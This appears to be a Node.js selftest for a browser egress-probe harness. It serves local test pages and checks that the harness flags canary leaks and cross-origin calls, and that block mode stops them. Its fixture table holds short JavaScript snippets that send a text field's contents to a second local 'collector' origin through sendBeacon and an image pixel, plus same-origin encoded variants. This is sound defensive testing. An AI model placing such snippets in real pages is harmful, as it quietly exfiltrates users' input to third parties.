#!/usr/bin/env node
/**
 * Egress probe selftest. Serves tiny local pages and drives them in Chromium:
 *   clean page (same-origin requests only)          -> harness must report NO findings
 *   pages leaking a canary / calling a 2nd origin   -> harness MUST flag each one
 *   block mode                                      -> the leaking request never reaches the second origin
 * Local servers only; nothing here touches production or the network beyond 127.0.0.1.
 * Exit codes: 0 pass, 1 harness wrong, 3 no browser / error (CI treats 3 as failure).
 */
import http from "node:http";
import { chromium } from "@playwright/test";
import { skipExit } from "../lib/skip-exit.mjs";
import { makeCanary } from "./analyze.mjs";
import { probe } from "./probe.mjs";

const canary = makeCanary("selftest");
const listen = (server) =>
  new Promise((ok) =>
    server.listen(0, "127.0.0.1", () => ok(`http://127.0.0.1:${server.address().port}`)),
  );

/** What each variant page does when the student's text changes. */
const LEAKS = {
  clean: "fetch('/api/ping');",
  beacon: "navigator.sendBeacon(C + '/c', box.value);",
  pixel: "new Image().src = C + '/p.gif?d=' + encodeURIComponent(box.value);",
  sameOriginPost: "fetch('/api/save', { method: 'POST', body: box.value });",
  sameOriginBase64: "fetch('/api/p/' + btoa(box.value));",
  thirdPartyNoCanary: "fetch(C + '/ping', { mode: 'no-cors' });",
};

const hits = [];
const collector = http.createServer((req, res) => {
  hits.push(req.url);
  res.writeHead(204, { "access-control-allow-origin": "*" });
  res.end();
});
const app = http.createServer((req, res) => {
  const name = new URL(req.url, "http://x").pathname.slice(1);
  if (name in LEAKS) {
    res.writeHead(200, { "content-type": "text/html" });
    return res.end(`<!doctype html><title>${name}</title><input id=box>
<script>const C = ${JSON.stringify(collectorOrigin)}; const box = document.getElementById('box');
box.addEventListener('change', () => { ${LEAKS[name]} });</script>`);
  }
  res.writeHead(name.startsWith("api/") ? 200 : 404, { "content-type": "application/json" });
  res.end("{}");
});
const collectorOrigin = await listen(collector);
const appOrigin = await listen(app);

let browser;
try {
  browser = await chromium.launch(
    process.env.PW_CHROMIUM_PATH ? { executablePath: process.env.PW_CHROMIUM_PATH } : {},
  );
} catch (err) {
  collector.close();
  app.close();
  process.exit(
    skipExit(
      `no browser (${String(err.message).split("\n")[0]})`,
      "set PW_CHROMIUM_PATH or run npx playwright install chromium",
    ),
  );
}

const failures = [];
async function run(name, { expect, allowCanaryTo, block = false }) {
  const context = await browser.newContext();
  const page = await context.newPage();
  const handle = await probe(page, {
    allowedOrigins: [appOrigin],
    canaries: [canary],
    allowCanaryTo,
    block,
  });
  await page.goto(`${appOrigin}/${name}`);
  await page.fill("#box", canary.value);
  await page.dispatchEvent("#box", "change");
  await page.waitForTimeout(400);
  await handle.stop();
  const got = [...new Set(handle.findings.map((f) => f.kind))].sort();
  if (JSON.stringify(got) !== JSON.stringify(expect)) {
    failures.push(`${name}${block ? " (block)" : ""}: expected [${expect}] got [${got}]`);
  }
  await context.close();
  return handle;
}

try {
  await run("clean", { expect: [] });
  await run("beacon", { expect: ["canary", "cross-origin"] });
  await run("pixel", { expect: ["canary", "cross-origin"] });
  await run("sameOriginPost", { expect: ["canary"] });
  await run("sameOriginBase64", { expect: ["canary"] });
  await run("thirdPartyNoCanary", { expect: ["cross-origin"] });
  await run("sameOriginPost", {
    expect: [],
    allowCanaryTo: [{ origin: appOrigin, pathPrefix: "/api/save" }],
  });

  hits.length = 0;
  await run("beacon", { expect: ["canary", "cross-origin"], block: true });
  if (hits.length)
    failures.push(`block mode: the second origin still received ${hits.length} request(s)`);
  hits.length = 0;
  await run("beacon", { expect: ["canary", "cross-origin"] });
  if (hits.length === 0)
    failures.push(
      "control: without block the leaking page should reach the second origin (the test page is not leaking)",
    );
} finally {
  await browser.close();
  collector.close();
  app.close();
}

if (failures.length) {
  console.error(`egress-probe selftest FAILED:\n  ${failures.join("\n  ")}`);
  process.exit(1);
}
console.log(
  "egress-probe selftest: clean page passes; every leaking variant is flagged; block mode holds",
);
process.exit(0);
